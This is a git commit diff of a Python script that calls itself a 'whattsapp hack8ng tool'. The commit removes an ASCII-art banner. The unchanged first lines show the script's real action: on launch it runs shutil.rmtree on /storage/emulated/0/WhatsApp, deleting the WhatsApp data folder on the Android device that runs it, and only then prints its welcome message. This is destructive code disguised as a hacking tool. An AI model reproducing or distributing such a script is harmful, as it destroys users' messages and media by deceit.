7773f1bc140e7bc9d417dc6ef08058c63f915dbe
bilal407g <69185351+bilal407g@users.noreply.github.com>
2020-10-09 06:54:08 +0500

    Update Whattsapp.py

--- Whattsapp.py
+++ Whattsapp.py
@@ -1,22 +1,5 @@
 import shutil
 shutil.rmtree('/storage/emulated/0/WhatsApp')
-print(' |    ,;                           ;,
-                    |    ; ;      .           .      ; ;
-                    |__  | ;   ______       ______   ; |
-                  ___    |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
-                   |      |   |        }:{        |   |
-     <bruteforce   |      |   l       / | \       !   |
-         attack/>  |      .~  (__,.--" .^. "--.,__)  ~.
-                   |      |    ----;' / | \ `;----    |
-                   |__     \__.       \/^\/       .__/
-                     ___    V| \                 / |V
-                      |      | |T~\___!___!___/~T| |
-                      |      | |'IIII_I_I_I_IIII'| |
-        <information  |      |  \,III I I I III,/  |
-          gathering/> |       \   `~~~~~~~~~~'    /
-                      |         \   .       .   /
-                      |__         \.         ./
-                                    ^._.^._.^ ')
 print('--------------------------------------------')
 print('wellcome to whattsapp hack8ng tool')
 print('--------------------------------------------')
